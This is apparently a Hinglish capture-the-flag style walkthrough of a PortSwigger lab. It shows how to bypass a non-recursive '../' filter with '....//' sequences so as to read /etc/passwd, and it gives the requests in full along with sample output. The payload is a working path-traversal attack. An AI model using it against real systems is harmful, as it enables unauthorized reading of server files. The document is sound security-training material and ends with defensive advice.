## 🔑 Step by Step Solution

### 1. Request capture karo

* Browser mein product image open karo (kisi product ka image).
* Burp Suite **Proxy** ON rakho aur request capture karo.
* Tumhe kuch aisa request milega (example):

```
GET /image?filename=20.jpg HTTP/1.1
Host: acxxxx.web-security-academy.net
```

---

### 2. Vulnerable parameter dhoondo

* Yahan `filename=20.jpg` wala parameter vulnerable hai kyunki image usi se load hoti hai.

---

### 3. Simple traversal try karo

* Normally hum `../../../../etc/passwd` try karte hain.
* Lekin yeh lab mein filter laga hua hai jo `../` ko strip (remove) karta hai.

Example:

```
filename=../../../../etc/passwd
```

➡️ Server isko strip karke **/etc/passwd** nahi banne dega.

---

### 4. Filter ko confuse karo (bypass)

* Yeh filter **non-recursive** hai, matlab woh sirf ek hi pass mein `../` remove karta hai.
* Agar tum input ko aise do jo pehle filter hone ke baad `../` ban jaye, toh bypass ho jayega.

Example trick:

```
filename=....//....//....//etc/passwd
```

* Jab server ek pass mein strip karega:

  * `....//` ko woh samajh nahi payega.
  * Strip hone ke baad yeh actually `../` ban jata hai.

---

### 5. Response observe karo

* Burp Repeater mein request bhejo:

```
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: acxxxx.web-security-academy.net
```

* Agar sahi exploit hua toh tumhe **/etc/passwd** file ka content aa jayega response mein.
* Example response:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

### 6. Lab complete ho jayega ✅

* Jaise hi tumhe `/etc/passwd` ka content dikh gaya, PortSwigger lab “Solved” dikha dega.

---

## 🧠 Key Learning

* Yeh lab dikhata hai ki **single-pass string replace filter** kabhi reliable nahi hota.
* Attackers creative sequences (e.g., `....//`) use karke filter bypass kar lete hain.
* Hamesha **canonicalization + allowlist** use karo.

---
